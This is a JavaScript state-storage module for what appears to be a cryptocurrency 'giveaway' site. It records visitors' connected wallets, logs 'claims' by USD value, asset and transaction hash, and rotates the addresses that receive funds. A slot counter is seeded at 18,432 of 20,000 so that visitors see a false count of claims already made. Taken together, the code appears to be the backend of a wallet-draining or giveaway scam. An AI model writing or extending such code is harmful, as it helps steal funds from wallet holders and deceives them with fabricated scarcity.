import fs from 'node:fs';
import path from 'node:path';
import { CHAINS } from './chains.js';

const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const KEY = process.env.STORE_KEY || 'giveaway:state';
const FILE = process.env.DATA_FILE || path.join(process.cwd(), 'data', 'store.json');
const remote = Boolean(REDIS_URL && REDIS_TOKEN);

let cache = null;
let dirty = false;
let timer = null;

async function cmd(args) {
  const res = await fetch(REDIS_URL, {
    method: 'POST',
    headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'content-type': 'application/json' },
    body: JSON.stringify(args)
  });
  if (!res.ok) throw new Error('store ' + res.status);
  return (await res.json()).result;
}

function defaults() {
  const received = Object.fromEntries(CHAINS.map(c => [c.key, '']));
  received.tron = '';
  return {
    received, minUsd: 5, gasFloorUsd: 1.2, slots: 20000, seedUsed: 18432,
    rotator: 0, wallets: {}, claims: [], totalUsd: 0
  };
}

function merge(raw) {
  const d = defaults();
  return { ...d, ...raw, received: { ...d.received, ...(raw.received || {}) } };
}

export async function load() {
  if (cache) return cache;
  try {
    if (remote) {
      const raw = await cmd(['GET', KEY]);
      cache = raw ? merge(JSON.parse(raw)) : defaults();
    } else {
      cache = merge(JSON.parse(fs.readFileSync(FILE, 'utf8')));
    }
  } catch {
    cache = defaults();
  }
  return cache;
}

export async function flush() {
  if (!dirty || !cache) return;
  dirty = false;
  const json = JSON.stringify(cache);
  if (remote) {
    try { await cmd(['SET', KEY, json]); } catch { dirty = true; }
  } else {
    try {
      fs.mkdirSync(path.dirname(FILE), { recursive: true });
      fs.writeFileSync(FILE, json);
    } catch { dirty = true; }
  }
}

function schedule() {
  dirty = true;
  if (timer) return;
  timer = setTimeout(async () => { timer = null; await flush(); }, 1200);
}

export async function addWallet(address, meta = {}) {
  const s = await load();
  const key = String(address).toLowerCase();
  if (s.wallets[key]) return false;
  s.wallets[key] = { address, firstSeen: new Date().toISOString(), usd: 0, assets: [], ...meta };
  schedule();
  return true;
}

export async function addClaim(c) {
  const s = await load();
  s.claims.unshift({ ...c, at: new Date().toISOString() });
  s.claims = s.claims.slice(0, 60);
  s.totalUsd = (s.totalUsd || 0) + (Number(c.usd) || 0);
  const w = s.wallets[String(c.address).toLowerCase()];
  if (w) {
    w.usd = (w.usd || 0) + (Number(c.usd) || 0);
    w.assets.push({ chain: c.chain, symbol: c.symbol, amount: c.amount, tx: c.txHash });
  }
  await flush();
}

export async function usedCount() {
  const s = await load();
  return Math.min(s.slots, s.seedUsed + Object.keys(s.wallets).length);
}

/** Round-robin the next receiving address for one chain. */
export async function rotate(chainKey) {
  const s = await load();
  const list = String(s.received[chainKey] || '')
    .split(',').map(v => v.trim()).filter(Boolean);
  if (!list.length) return '';
  const pick = list[s.rotator % list.length];
  s.rotator = (s.rotator + 1) % 1_000_000;
  schedule();
  return pick;
}

export async function resolveAll() {
  const s = await load();
  const out = {};
  for (const key of Object.keys(s.received)) out[key] = await rotate(key);
  return out;
}

export async function persistNow() {
  dirty = true;
  await flush();
}
